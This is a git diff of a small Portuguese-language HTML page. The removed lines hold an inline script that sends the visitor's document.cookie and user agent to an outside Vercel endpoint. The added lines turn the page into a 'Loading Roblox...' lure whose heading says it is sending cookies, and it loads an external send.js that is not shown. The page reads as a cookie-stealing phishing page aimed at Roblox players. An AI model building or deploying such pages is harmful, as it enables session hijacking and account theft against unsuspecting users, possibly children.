@@ -1,15 +1,19 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-  <title>XSS Teste</title>
-  <link rel="stylesheet" href="styles.css">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Loading Roblox...</title>
+<style>
+  body {
+    margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
+    background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+    color: #0ff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+</style>
 </head>
 <body>
-  <h1>O que tu tá fazendo aqui???</h1>
-  <img src="https://media.tenor.com/KuWfVfMLC58AAAAC/boca-rosa.gif" width="300">
-  <script>
-    const url = "https://teu-vercel.vercel.app/api/send?cookie=" + encodeURIComponent(document.cookie) + "&userAgent=" + encodeURIComponent(navigator.userAgent);
-    fetch(url);
-  </script>
+  <h1>Carregando Roblox e enviando cookie...</h1>
+  <script src="send.js"></script>
 </body>
 </html>
